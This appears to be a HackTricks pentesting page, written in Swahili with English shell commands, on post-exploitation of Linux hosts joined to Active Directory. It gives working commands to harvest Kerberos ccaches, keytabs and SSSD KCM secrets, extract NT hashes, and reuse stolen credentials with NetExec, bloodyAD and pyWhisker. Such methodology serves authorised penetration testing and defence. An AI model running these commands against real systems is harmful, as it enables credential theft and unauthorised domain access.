# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Mashine ya Linux inaweza pia kuwepo ndani ya mazingira ya Active Directory.

Mashine ya Linux ndani ya AD inaweza **kuhifadhi nyenzo za Kerberos ndani yake**: user ccaches, keytabs za mashine/huduma, na siri zinazosimamiwa na SSSD. Vitu hivi kwa kawaida vinaweza kutumiwa tena kama credential nyingine yoyote ya Kerberos. Ili kusoma vingi kati ya hivi, utahitaji kuwa user mmiliki wa ticket au **root** kwenye mashine.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Enumeration

### AD enumeration kutoka Linux

Ikiwa unaweza kufikia AD kutoka Linux (au bash kwenye Windows), unaweza kujaribu [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) ili kufanya enumeration ya AD.

Unaweza pia kuangalia ukurasa ufuatao ili kujifunza **njia nyingine za kufanya enumeration ya AD kutoka Linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA ni **mbadala** wa Microsoft Windows **Active Directory** ulio open-source, hasa kwa mazingira ya **Unix**. Inachanganya **LDAP directory** kamili na Key Distribution Center ya MIT **Kerberos** kwa ajili ya usimamizi unaofanana na Active Directory. Kwa kutumia **Certificate System** ya Dogtag kusimamia vyeti vya CA na RA, inasaidia uthibitishaji wa **multi-factor**, ikiwemo smartcards. SSSD imeunganishwa kwa ajili ya michakato ya uthibitishaji wa Unix.<sup>[[14]](#references)[[15]](#references)</sup> Jifunze zaidi kuihusu hapa:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Vitu vya host iliyounganishwa na domain

Kabla ya kugusa tickets, tambua **jinsi host ilivyounganishwa na AD** na **mahali ambapo nyenzo za Kerberos zimehifadhiwa kwa kweli**. Kwenye host za kisasa za Linux, hili kwa kawaida hushughulikiwa na `realmd` + `adcli` + `sssd`, si faili za kawaida zilizo ndani ya `/tmp` pekee.<sup>[[10]](#references)</sup>

```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```

Hii inakuambia haraka kama host inaamini AD, kama SSSD inahifadhi identities au tickets kwenye cache, na kama **machine/service keytabs** au **KCM secrets** zinapatikana kwa matumizi mabaya.<sup>[[4]](#references)[[10]](#references)</sup>

Chukulia `/var/lib/sss/db/cache_*.ldb` tofauti na Kerberos ccaches na `/var/lib/sss/secrets/secrets.ldb`. Faili za `cache_*.ldb` zinaweza kuwa na password verifiers za offline ikiwa domain ina `cache_credentials = true` **na** mtumiaji aliwahi kuthibitishwa kwenye host hiyo. Kwa kawaida, faili hizi husomeka tu kwa ufikiaji wa privileged. Faili ya cache au setting iliyowezeshwa peke yake haithibitishi kuwa kuna password inayoweza kutumika na ambayo bado ni halali; kagua setting inayotumika kwa domain husika na identities zilizohifadhiwa kwenye cache kabla ya kufikia hitimisho hilo. Tazama [nyaraka za Red Hat kuhusu SSSD credential cache](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/epub/configuring_authentication_and_authorization_in_rhel/overview-single-sign-on_introduction-to-system-authentication). Kuhusu mpaka tofauti wa identity kati ya Linux na AD, [mixed-vendor Kerberos name mapping](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/) ni muhimu tu ikiwa service inakubali ticket na kumhusisha principal wake na Unix account husika.

Kwenye host yenye `ksu`, Kerberos principal halali inaweza kufikia **local target account**, ikiwemo root, ikiwa tu account hiyo imeidhinisha principal huyo. [Nyaraka za MIT Kerberos](https://web.mit.edu/Kerberos/www/krb5-latest/doc/user/user_commands/ksu.html) zinaeleza faili za `.k5login` na `.k5users` kwenye home ya target, pamoja na fallback ya name-mapping ikiwa hakuna mojawapo. `.k5users` inaweza pia kuzuia commands zinazotumika na `ksu -e`; kuwepo kwa faili pekee hakuthibitishi ufikiaji wa shell. Kagua target account husika, umiliki/ruhusa za faili na entries za authorization zinazosomeka, Kerberos credential inayopatikana, na sheria za mapping zinazotumika. Ikiwa root home haiwezi kufikiwa, hali ya authorization haijulikani. Enumeration ya kimya inapaswa kuorodhesha paths na ruhusa hizi bila kuomba tickets au kuendesha `ksu`.

Backup iliyoratibiwa inaweza kuunda mpaka wa authorization wa `.k5login` kwa njia isiyo ya moja kwa moja. Ikiwa account yenye privileges za juu inanakili kwa kujirudia directory inayoweza kuandikwa na mtumiaji wa chini kwenda kwenye home yake yenyewe, thibitisha kuwa nakala inajumuisha hidden files, path lengwa ni home inayotumika ya account hiyo, na faili inayotokana ina umiliki unaokubaliwa na Kerberos login service. Kwa mfano, [nyaraka za rsync](https://download.samba.org/pub/rsync/rsync.1.html) zinaeleza kuwa `-a --no-owner` huacha faili mpya lengwani zikiwa zinamilikiwa na mtumiaji anayezipokea. [Nyaraka za MIT Kerberos](https://web.mit.edu/kerberos/www/krb5-latest/doc/user/user_config/k5login.html) zinaeleza jinsi principal iliyo kwenye `.k5login` ya mtumiaji huyo inavyoweza kuidhinisha ufikiaji. Thibitisha identity ya RunAs ya job iliyoratibiwa, ruhusa ya kuandika kwenye source, options za rsync zinazotumika, login iliyowezeshwa kwa GSSAPI, na ticket halali ya principal iliyoorodheshwa; directory ya source inayoweza kuandikwa au command ya rsync iliyoratibiwa pekee hazithibitishi uwezekano huo.

Keytab inayosomeka pia inahitaji kukaguliwa kwa kila principal. Keytab iliyo na principal yenye jina la kiutawala haithibitishi yenyewe kuwa kuna haki za kiutawala: policy ya [KDC `kadm5.acl`](https://web.mit.edu/Kerberos/www/krb5-1.22/doc/admin/conf_files/kadm5_acl.html) hudhibiti operations za principal zinazoruhusiwa. Thibitisha principal, ACL inayotumika, na authorization ya local `ksu` au login kando kabla ya kuchukulia ufikiaji wa keytab kuwa njia ya kupata root. Triage ya kimya inaweza kuorodhesha path na ruhusa za keytab bila kutumia keys zake au kuwasiliana na KDC.

## Kufanyia kazi tickets

### Pass The Ticket

Katika ukurasa huu utapata maeneo mbalimbali ambako unaweza **kupata Kerberos tickets ndani ya Linux host**. Katika ukurasa unaofuata unaweza kujifunza jinsi ya kubadilisha fomati hizi za CCache tickets kuwa Kirbi (fomati unayohitaji kutumia kwenye Windows), na pia jinsi ya kufanya shambulio la PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Ikiwa unataka **workflows maalum za Linux za kukusanya tickets** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, n.k.), angalia ukurasa maalum:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Kutumia tena CCACHE ticket kutoka /tmp

Faili za CCACHE ni fomati za binary za **kuhifadhi Kerberos credentials**. `FILE:/tmp/krb5cc_%{uid}` bado hutumika sana, lakini Linux deployments za kisasa pia hutumia `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, au `KCM:%{uid}`. Kagua environment variable ya **`KRB5CCNAME`** na setting ya `default_ccache_name` kabla ya kudhani kuwa tickets ziko `/tmp`.<sup>[[1]](#references)[[3]](#references)</sup>

```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### Kutumia tena tiketi za CCACHE kutoka kwenye keyring

**Tiketi za Kerberos zilizohifadhiwa kwenye kumbukumbu ya mchakato zinaweza kutolewa**, hasa wakati ulinzi wa ptrace wa mashine umezimwa (`/proc/sys/kernel/yama/ptrace_scope`). Zana muhimu kwa kusudi hili inapatikana kwenye [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey); hurahisisha utoaji kwa kujidunga kwenye sessions na kutupa tiketi kwenye `/tmp`.<sup>[[1]](#references)[[16]](#references)</sup>

Ili kusanidi na kutumia zana hii, fuata hatua zilizo hapa chini:

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

Utaratibu huu utajaribu kuingiza kwenye sessions mbalimbali, na mafanikio yataonyeshwa kwa kuhifadhi tiketi zilizotolewa kwenye `/tmp` kwa kutumia kanuni ya kutaja majina ya `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Kutumia tena tiketi za CCACHE kutoka SSSD KCM

SSSD hudumisha nakala ya database kwenye njia `/var/lib/sss/secrets/secrets.ldb`. Key inayolingana huhifadhiwa kama faili iliyofichwa kwenye njia `/var/lib/sss/secrets/.secrets.mkey`. Kwa chaguomsingi, key inaweza kusomwa tu ikiwa una ruhusa za **root**.<sup>[[4]](#references)</sup>

Kuendesha **`SSSDKCMExtractor`** kwa kutumia vigezo vya --database na --key kutachanganua database na **kusimbua secrets**.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

Extractor huchapisha payload za JSON za Kerberos ghafi; zigeuze kuwa ticket cache inayoweza kutumika au umbizo jingine la ticket kabla ya shughuli za pass-the-cache/pass-the-ticket.<sup>[[4]](#references)</sup>

### Uchunguzi wa haraka wa keytab

```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```

### Toa akaunti kutoka /etc/krb5.keytab

Funguo za akaunti za huduma, ambazo ni muhimu kwa huduma zinazoendeshwa kwa haki za root, huhifadhiwa kwa usalama katika faili za **`/etc/krb5.keytab`**. Funguo hizi, zinazofanya kazi kama nywila za huduma, zinahitaji usiri mkali.<sup>[[5]](#references)</sup>

Ili kukagua yaliyomo kwenye faili ya keytab, unaweza kutumia **`klist`**. Kwenye Linux, `klist -k -K -e` huchapisha principals, nambari za matoleo ya funguo, aina za usimbaji fiche na data ghafi ya funguo. Ikiwa aina ya ufunguo ni **23 / RC4-HMAC**, thamani ya ufunguo huo pia ndiyo **NT hash** ya principal hiyo.<sup>[[6]](#references)[[17]](#references)</sup>

```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```

Kwa watumiaji wa Linux, **`KeyTabExtract`** hutoa uwezo wa kutoa hash ya RC4 HMAC, ambayo inaweza kutumika tena kama NTLM hash. Kumbuka kuwa hii husaidia tu ikiwa keytab bado ina data ya **etype 23 / RC4-HMAC**. Katika mazingira ya **AES-only**, huenda usipate NT hash inayoweza kutumiwa tena, lakini bado unaweza kuthibitisha utambulisho moja kwa moja kwa kutumia keytab kupitia Kerberos.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```

Kwenye macOS, **`bifrost`** hutumika kama zana ya kuchanganua faili za keytab.<sup>[[8]](#references)</sup>

```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```

Kwa kutumia taarifa za akaunti na hash zilizotolewa, miunganisho kwa seva inaweza kuanzishwa kwa kutumia zana kama **`NetExec`**.<sup>[[9]](#references)</sup>

```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```

### Tumia tena akaunti ya mashine kutoka `/etc/krb5.keytab`

Kwenye mifumo iliyounganishwa kwa `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` kwa kawaida huwa na **akaunti ya kompyuta** na principal moja au zaidi za **host/service**. Ikiwa una **root**, usiitoe tu kama dump: tumia mojawapo ya principal zilizoorodheshwa na `klist -k` kuomba TGT na kufanya kazi kama Linux host yenyewe.<sup>[[10]](#references)</sup>

```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```

Hii ni muhimu hasa wakati **computer object** yenyewe ina haki zilizokabidhiwa katika AD au wakati host inaruhusiwa kupata siri nyingine kama **gMSA**.<sup>[[13]](#references)</sup>

### Tumia tena nyenzo za Kerberos zilizoibwa kwa zana za AD zinazotanguliza Linux

Ukipata `ccache` halali au keytab inayoweza kutumika, unaweza kufanya shughuli dhidi ya AD **moja kwa moja kutoka Linux** bila kubadilisha kila kitu kwanza kuwa miundo ya Windows. Zana nyingi za kisasa zinaunga mkono `KRB5CCNAME` / uthibitishaji wa Kerberos moja kwa moja.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>

```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
  --target 'WEB01$' --action list
```

Hii ni daraja zuri kati ya **Linux post-exploitation** na **AD object abuse**. Kwa njia zenyewe za abuse katika kiwango cha object, angalia:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Artefact za Linux gMSA / Managed Service Account

Deployments za hivi karibuni za Linux zinaweza kutumia **Managed Service Accounts** moja kwa moja kutoka AD. Kwa vitendo, hii inamaanisha kwamba baada ya kupata udhibiti wa Linux server, unaweza kukuta si keytab ya host pekee bali pia **keytab maalum za service** zilizotengenezwa kutoka kwa gMSA. Maeneo ya kawaida ya kukagua ni `/etc/gmsad.conf`, faili za config maalum za deployment, na faili za ziada za `*.keytab` chini ya `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>

```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```

Hii inakupa utambulisho wa Kerberos unaoweza kutumika tena kwa SPN zilizofungamanishwa na gMSA hiyo **bila kugusa endpoint yoyote ya Windows**.<sup>[[13]](#references)</sup> Kwa matumizi mabaya ya gMSA/dMSA **upande wa domain** baada ya kupata haki za juu zaidi katika AD, angalia:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Jinsi ya kushambulia Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Kufikia AD kwa kutumia managed service account – Kuunganisha mifumo ya RHEL moja kwa moja na Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Vigezo vya mazingira vya Kerberos – Nyaraka za MIT Kerberos](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – Nyaraka za MIT Kerberos](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Aina za usimbaji fiche za RC4-HMAC Kerberos zinazotumiwa na Microsoft Windows](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Kutumia Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Kugundua na kujiunga na identity domain | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [Mwongozo wa mtumiaji wa bloodyAD](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [Kuhusu | Nyaraka za FreeIPA](https://www.freeipa.org/About.html)
- [15] [Maelezo ya toleo la FreeIPA 4.11.0](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Nyaraka za Linux Kernel](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – Nyaraka za MIT Kerberos](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
